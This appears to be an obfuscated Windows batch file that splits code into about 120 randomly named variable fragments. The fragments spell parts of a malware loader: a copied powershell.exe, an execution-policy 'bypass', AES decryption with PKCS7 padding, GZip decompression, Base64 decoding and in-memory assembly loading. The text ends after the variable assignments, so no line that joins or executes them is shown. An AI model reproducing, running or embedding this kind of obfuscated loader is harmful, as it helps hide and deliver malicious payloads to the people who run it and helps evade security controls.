@echo off
set "mHWAtqKpfG=s\"
set "SHDLMWvIRP=em"
set "cWNsKSbGyk=Po"
set "eJbqhKbsrY=Wi"
set "avQUMloUKA=we"
set "ryRgCsExVT=Sy"
set "PlWRdkNsCz=we"
set "ecqNdqWaPz= /"
set "JNIbeVRHIO=:\"
set "aMFnrtRjfg= C"
set "IsSvINUIZt=.e"
set "UxxRglSdlA=rs"
set "XVGgsTlCCU=do"
set "BmNvDahovA=he"
set "BrWaUjeuop=rS"
set "ErjkglIsSl=nd"
set "xAwTBepEpy=py"
set "fuyVtNTyVy=\W"
set "myOxFVmbXy=st"
set "czXcHWnDWC=0\"
set "XoFkEatCgc=co"
set "DVEXsyiIsY=ws"
set "xDBxcGIcqw=ll"
set "CPMPRfEvmC=y "
set "AtnmUKrrxa=32"
set "lsAfELgUZR=po"
set "SFdsesYMUi=ll"
set "NGrjIDxAoc=1."
set "jjxZsJSuOF=ow"
set "yxQUqvglEW=he"
set "KPfSwLaMxB=\v"
set "TdJztDEVEq=xe"
set "eIrHNKUguF=in"
set "dwjLQXuJVX=cd"
set "ZBbbMDwvjz= %~dp0"
set "yDKKXyvDmQ=D.Pa"
set "rvzBqCeDQh=)($B"
set "WZltWfVsrd=brea"
set "gRwYPSAGNa= = $"
set "kAUlWdThMu=.Cop"
set "jMuWNqbgoY=1] -"
set "jQViPYHLLt=ptor"
set "HrHefytTPJ=)($d"
set "xQMeNGkZOj=eMVs"
set "PgAWjcyEmT=nirt"
set "IkXzITkqlf=Secu"
set "oJtFoWZptU=ing("
set "vauSvnjKBS=ric."
set "bLkWmhjxrd=gMod"
set "uqYBhTDPSe=Star"
set "XgQKLBKXUn=S46e"
set "TrmMQWxdDX=.Sec"
set "fXcErWqmTS=:: '"
set "LlRLjuoUuo=;$Rd"
set "gDajdbUvSB= = $"
set "nZzBEZUxrg=yste"
set "gUpQYwZvoy=oArr"
set "ADJcCVpKFA=ion."
set "WUnQVqciSz=ment"
set "GdXNiizNje=iZ.T"
set "tFLxHhPwtX=fV);"
set "bCJjEFQqmy=7;$m"
set "iRwNxbyvUd=l5E7"
set "iTsxBFLXZF=raph"
set "gZofYinxWL=PKCS"
set "ygbcpvVtCD=)))"
set "uLWMZCVIow=;$Gn"
set "mjHoNjjUwf=Comp"
set "VcwYsTgKWc=e = "
set "HNCiAGknNj=RnyN"
set "ocnutBStky=);$T"
set "iLshElqgLy=onve"
set "rraOXQAvwh=y]::"
set "XvQHSImArk=ewLi"
set "LcMVvwTDKh=-1.."
set "IaFVAQEjnP=ddin"
set "OTsIYrbxNp=.Ass"
set "EnyWjxhtnb=$kxR"
set "xRsfmiJQgf=.Con"
set "aPexvtLyGm=.Mod"
set "uxgufUOApb=)) {"
set "QmEQhaCYQd=;$ly"
set "nAHWgfqCDB=]::N"
set "ElWJQNHDPi=mTYS"
set "gxJjEDVhBk=gnir"
set "TMAFcyDazs= = ["
set "jFOmKLjufX=zuZI"
set "gTsxeAapbJ=ress"
set "dwJukaxpnQ= [Sy"
set "vtaoBYbebL=embl"
set "vAHJKSmCYd=-Obj"
set "quJORYQacz=mhsF"
set "lznxZvuHJC=ert]"
set "ZLntgjmRLI=esMa"
set "HnHxGxEvYW=.GZi"
set "dvYfOkfxGq=ddin"
set "hkcPfTiKdA=BgSf"
set "eBQIMbUVlt=($LS"
set "GeLtmADYHa=le  "
set "WrGrhyzBoh=join"
set "eWPbPbLDfM=lBlo"
set "TupAqMtpeu=and "
set "VEmUZvNKbx=pStr"
set "jgMWNXfAoN=V = "
set "NLoxetKqLO=hy.A"
set "ZQuUDlhQqq=-joi"
set "TUVxRRfcuq='0Pg"
set "OHgAxmMIUY=; };"
set "mqaHYznsdb=zJg."
set "aeFFUhXWuG=Bmor"
set "nOAcMvtkJP=SD.I"
set "kLDOuaoweV=xmhs"
set "rMAbevIxAC=em.C"
set "nhmrxREOiH=);$k"
set "lBOHjumFCd=dj0C"
set "HGBFZKPRKa=vKfI"
set "DcngNdtxLk=);$m"
set "KGIcLkXeUt=PxEW"
set "xULvoSaKad=bypa"
set "qhzmJgKuPY= '')"
